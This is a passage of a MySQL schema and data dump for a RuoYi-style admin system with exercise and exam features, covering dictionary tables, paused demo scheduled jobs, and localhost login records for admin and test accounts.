INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (27, 9, '清空数据', '9', 'sys_oper_type', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '清空操作');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (28, 1, '成功', '0', 'sys_common_status', '', 'primary', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '正常状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (29, 2, '失败', '1', 'sys_common_status', '', 'danger', 'N', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '停用状态');
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (100, 1, '选择', '0', 'sys_exercise_type', NULL, 'default', 'N', '0', 'admin', '2023-10-24 09:27:10', 'admin', '2023-10-24 09:27:37', NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (101, 0, '判断', '1', 'sys_exercise_type', NULL, 'default', 'N', '0', 'admin', '2023-10-24 09:27:20', '', NULL, NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (102, 0, '基础题', '0', 'sys_exercise_cate', NULL, 'default', 'N', '1', 'admin', '2023-10-25 08:56:10', 'admin', '2023-10-27 16:36:44', NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (103, 1, '阅读程序题', '1', 'sys_exercise_cate', NULL, 'default', 'N', '0', 'admin', '2023-10-25 08:56:24', '', NULL, NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (104, 2, '补全程序题', '2', 'sys_exercise_cate', NULL, 'default', 'N', '0', 'admin', '2023-10-25 08:56:36', '', NULL, NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (106, 0, '未开始', '0', 'exam_status', NULL, 'default', 'N', '0', 'admin', '2023-11-05 20:20:11', '', NULL, NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (107, 1, '进行中', '1', 'exam_status', NULL, 'default', 'N', '0', 'admin', '2023-11-05 20:20:28', '', NULL, NULL);
INSERT INTO `sys_dict_data` (`dict_code`, `dict_sort`, `dict_label`, `dict_value`, `dict_type`, `css_class`, `list_class`, `is_default`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (108, 2, '已结束', '2', 'exam_status', NULL, 'default', 'N', '0', 'admin', '2023-11-05 20:20:40', '', NULL, NULL);
COMMIT;

-- ----------------------------
-- Table structure for sys_dict_type
-- ----------------------------
DROP TABLE IF EXISTS `sys_dict_type`;
CREATE TABLE `sys_dict_type` (
  `dict_id` bigint NOT NULL AUTO_INCREMENT COMMENT '字典主键',
  `dict_name` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '字典名称',
  `dict_type` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '字典类型',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`dict_id`),
  UNIQUE KEY `dict_type` (`dict_type`)
) ENGINE=InnoDB AUTO_INCREMENT=103 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='字典类型表';

-- ----------------------------
-- Records of sys_dict_type
-- ----------------------------
BEGIN;
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '用户性别', 'sys_user_sex', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '用户性别列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '菜单状态', 'sys_show_hide', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '菜单状态列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, '系统开关', 'sys_normal_disable', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '系统开关列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (4, '任务状态', 'sys_job_status', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '任务状态列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (5, '任务分组', 'sys_job_group', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '任务分组列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (6, '系统是否', 'sys_yes_no', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '系统是否列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (7, '通知类型', 'sys_notice_type', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '通知类型列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (8, '通知状态', 'sys_notice_status', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '通知状态列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (9, '操作类型', 'sys_oper_type', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '操作类型列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (10, '系统状态', 'sys_common_status', '0', 'admin', '2023-10-23 20:57:31', '', NULL, '登录状态列表');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (100, '题目类型', 'sys_exercise_type', '0', 'admin', '2023-10-24 09:26:19', '', NULL, '题目类型字典值');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (101, '题目分类', 'sys_exercise_cate', '0', 'admin', '2023-10-25 08:55:40', 'admin', '2023-10-25 08:55:53', '题目分类字典值');
INSERT INTO `sys_dict_type` (`dict_id`, `dict_name`, `dict_type`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (102, '考试状态', 'exam_status', '0', 'admin', '2023-11-05 20:19:51', '', NULL, NULL);
COMMIT;

-- ----------------------------
-- Table structure for sys_job
-- ----------------------------
DROP TABLE IF EXISTS `sys_job`;
CREATE TABLE `sys_job` (
  `job_id` bigint NOT NULL AUTO_INCREMENT COMMENT '任务ID',
  `job_name` varchar(64) COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '任务名称',
  `job_group` varchar(64) COLLATE utf8mb4_general_ci NOT NULL DEFAULT 'DEFAULT' COMMENT '任务组名',
  `invoke_target` varchar(500) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调用目标字符串',
  `cron_expression` varchar(255) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT 'cron执行表达式',
  `misfire_policy` varchar(20) COLLATE utf8mb4_general_ci DEFAULT '3' COMMENT '计划执行错误策略（1立即执行 2执行一次 3放弃执行）',
  `concurrent` char(1) COLLATE utf8mb4_general_ci DEFAULT '1' COMMENT '是否并发执行（0允许 1禁止）',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '状态（0正常 1暂停）',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '备注信息',
  PRIMARY KEY (`job_id`,`job_name`,`job_group`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='定时任务调度表';

-- ----------------------------
-- Records of sys_job
-- ----------------------------
BEGIN;
INSERT INTO `sys_job` (`job_id`, `job_name`, `job_group`, `invoke_target`, `cron_expression`, `misfire_policy`, `concurrent`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (1, '系统默认（无参）', 'DEFAULT', 'ryTask.ryNoParams', '0/10 * * * * ?', '3', '1', '1', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_job` (`job_id`, `job_name`, `job_group`, `invoke_target`, `cron_expression`, `misfire_policy`, `concurrent`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, '系统默认（有参）', 'DEFAULT', 'ryTask.ryParams(\'ry\')', '0/15 * * * * ?', '3', '1', '1', 'admin', '2023-10-23 20:57:31', '', NULL, '');
INSERT INTO `sys_job` (`job_id`, `job_name`, `job_group`, `invoke_target`, `cron_expression`, `misfire_policy`, `concurrent`, `status`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (3, '系统默认（多参）', 'DEFAULT', 'ryTask.ryMultipleParams(\'ry\', true, 2000L, 316.50D, 100)', '0/20 * * * * ?', '3', '1', '1', 'admin', '2023-10-23 20:57:31', '', NULL, '');
COMMIT;

-- ----------------------------
-- Table structure for sys_job_log
-- ----------------------------
DROP TABLE IF EXISTS `sys_job_log`;
CREATE TABLE `sys_job_log` (
  `job_log_id` bigint NOT NULL AUTO_INCREMENT COMMENT '任务日志ID',
  `job_name` varchar(64) COLLATE utf8mb4_general_ci NOT NULL COMMENT '任务名称',
  `job_group` varchar(64) COLLATE utf8mb4_general_ci NOT NULL COMMENT '任务组名',
  `invoke_target` varchar(500) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调用目标字符串',
  `job_message` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '日志信息',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '执行状态（0正常 1失败）',
  `exception_info` varchar(2000) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '异常信息',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`job_log_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='定时任务调度日志表';

-- ----------------------------
-- Records of sys_job_log
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for sys_logininfor
-- ----------------------------
DROP TABLE IF EXISTS `sys_logininfor`;
CREATE TABLE `sys_logininfor` (
  `info_id` bigint NOT NULL AUTO_INCREMENT COMMENT '访问ID',
  `user_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '用户账号',
  `ipaddr` varchar(128) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '登录IP地址',
  `login_location` varchar(255) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '登录地点',
  `browser` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '浏览器类型',
  `os` varchar(50) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '操作系统',
  `status` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '登录状态（0成功 1失败）',
  `msg` varchar(255) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '提示消息',
  `login_time` datetime DEFAULT NULL COMMENT '访问时间',
  PRIMARY KEY (`info_id`),
  KEY `idx_sys_logininfor_s` (`status`),
  KEY `idx_sys_logininfor_lt` (`login_time`)
) ENGINE=InnoDB AUTO_INCREMENT=437 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='系统访问记录';

-- ----------------------------
-- Records of sys_logininfor
-- ----------------------------
BEGIN;
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (100, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-23 20:58:46');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (101, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-24 09:15:42');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (102, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-24 10:17:06');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (103, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-24 10:17:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (104, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-25 08:53:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (105, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-25 14:08:13');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (106, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-25 14:08:19');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (107, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-25 15:43:55');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (108, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-25 15:44:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (109, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-26 09:18:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (110, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-26 16:28:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (111, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-26 17:06:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (112, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码已失效', '2023-10-27 09:23:00');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (113, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-27 09:23:09');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (114, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-27 10:38:42');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (115, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-27 15:53:19');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (116, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-30 08:45:03');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (117, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-30 09:29:59');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (118, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-30 10:07:58');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (119, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-30 14:19:10');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (120, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-30 17:51:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (121, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-31 08:29:19');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (122, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-31 08:29:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (123, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 08:29:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (124, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-31 13:58:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (125, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-31 13:58:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (126, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 13:58:54');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (127, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-31 15:13:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (128, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 15:13:48');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (129, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-31 15:40:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (130, 'test', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 15:40:27');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (131, 'test', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-31 15:50:52');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (132, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-31 15:51:00');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (133, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码错误', '2023-10-31 15:51:04');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (134, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 15:51:08');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (135, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-10-31 15:51:24');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (136, 'test', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 15:51:33');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (137, 'test', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 18:52:24');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (138, 'test', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 20:12:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (139, 'test', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-10-31 20:43:24');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (140, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '密码输入错误1次', '2023-11-01 08:24:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (141, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '用户不存在/密码错误', '2023-11-01 08:24:36');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (142, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 08:24:43');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (143, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-01 08:24:53');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (144, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 08:24:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (145, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '退出成功', '2023-11-01 08:25:17');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (146, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 08:25:23');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (147, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 10:06:08');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (148, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 13:56:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (149, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 14:50:44');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (150, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 16:09:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (151, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 19:05:18');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (152, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 19:35:45');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (153, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-01 20:55:20');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (154, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '1', '验证码已失效', '2023-11-02 08:27:50');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (155, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-02 08:27:57');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (156, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-02 10:34:00');
INSERT INTO `sys_logininfor` (`info_id`, `user_name`, `ipaddr`, `login_location`, `browser`, `os`, `status`, `msg`, `login_time`) VALUES (157, 'admin', '127.0.0.1', '内网IP', 'Chrome 11', 'Mac OS X', '0', '登录成功', '2023-11-02 14:00:40');
